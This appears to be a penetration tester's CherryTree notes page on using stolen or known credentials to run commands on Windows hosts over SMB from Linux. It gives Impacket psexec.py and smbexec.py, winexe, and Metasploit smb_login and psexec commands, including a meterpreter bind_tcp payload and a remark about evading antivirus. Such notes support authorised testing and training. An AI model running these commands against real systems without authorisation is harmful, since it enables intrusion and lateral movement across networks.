<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>via SMB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Using Credentials - from Linux - via SMB</h1></strong><br />All of these methods require the ability to:<br />• write to a share on the remote host<br />• start a service - which usually only Administrators can do<br /><br /><strong><h2>## Impacket&#39;s psexec.py</h2></strong><br /><strong><h3>### About</h3></strong><br />• <code>PsExec</code> is a Sysinternals Windows telnet replacement “that lets you execute processes on other systems”<br />   ◇ <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br />• Impacket wrote an open source version in python - <code>psexec.py</code><br />   ◇ It&#39;s based on <code>RemComSvc</code><br />   ◇ <code>RemComSvc</code> is a now deprecated C++ tool that was an open source inspiration of Sysinternal&#39;s <code>PsExec</code>.<br /><br /><strong><h3>### Requires</h3></strong><br />• <code>psexec.py</code> requires to ability to:<br />   ◇ write to an SMB share<br />   ◇ Start SVCManager on remote host - usually only Admins can do<br /><br />psexec will get you an NT AUTHORITY/SYSTEM shell (not Administrator)<br /><br /><strong><h3>### Usage</h3></strong><br /><code>psexec.py DOMAIN/username@10.10.10.10</code><br /><br />Start 32-bit PowerShell process<br /><code>psexec.py DOMAIN/username@10.10.10.10 powershell.exe</code><br /><br />Start 64-bit PowerShell process<br /><code>psexec.py DOMAIN/username@10.10.10.10 &quot;C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe&quot;</code><br /><br /><strong><h2>## Impacket&#39;s smbexec.py</h2></strong><br /><strong><h3>### About</h3></strong><br />• similar approach to psexec w/o using RemComSvc<br />• installs a local smbserver to receive the output of the commands<br />   ◇ useful in the situation where the target machine does NOT have a writeable share available<br />• might avoid AV<br />• but will generate a ton of event logs<br />• can&#39;t execute commands that take a long time because windows will kill the process since its&#39; not responding as a Windows service<br /><br /><strong><h3>### Requires</h3></strong><br />• Does NOT require a writeable share available<br />• Requires RPC access<br /><br /><code>smbexec.py DOMAIN/username@10.10.10.10</code><br /><br /><strong><h2>## winexe</h2></strong><br /><strong><h3>### About</h3></strong><br />• Old (last updated 6 years ago according to gitlab)<br />• Reliably works against Windows NT/2000/XP/2003<br />• Uses <code>Admin$</code> via SMB and RPC <code>net service start</code> to install and start a remote service (winexesvc) to create named pipe to transport commands between client and server<br />   ◇ <a href="https://serverfault.com/questions/521371/winexe-how-winexe-perform-login-to-remote-machine-by-which-protocol">https://serverfault.com/questions/521371/winexe-how-winexe-perform-login-to-remote-machine-by-which-protocol</a><br /><br /><strong><h3>### Requires</h3></strong><br />• Ability to write to <code>Admin$</code> and start services over RPC<br /><br /><strong><h3>### Usage</h3></strong><br /><code>winexe -U DOMAIN/username //10.10.10.10 cmd.exe</code><br /><br /><strong><h2>## Metasploit<br /></h2></strong><strong><h3>### smb_login</h3></strong><br /><code>use auxiliary/scanner/smb/smb_login<br />set SMBDomain DOMAIN<br />set SMBUser username<br />set SMBPass password<br />services -p 445 -R<br />run<br />creds</code><br /><br /><strong><h3>### psexec</h3></strong><br /><code>use exploit/windows/smb/psexec<br />set RHOST 10.2.0.3<br />set SMBUser username<br />set SMBPass password<br />set PAYLOAD windows/meterpreter/bind_tcp<br />run<br />shell</code><br /><br /></div>
</body>
</html>
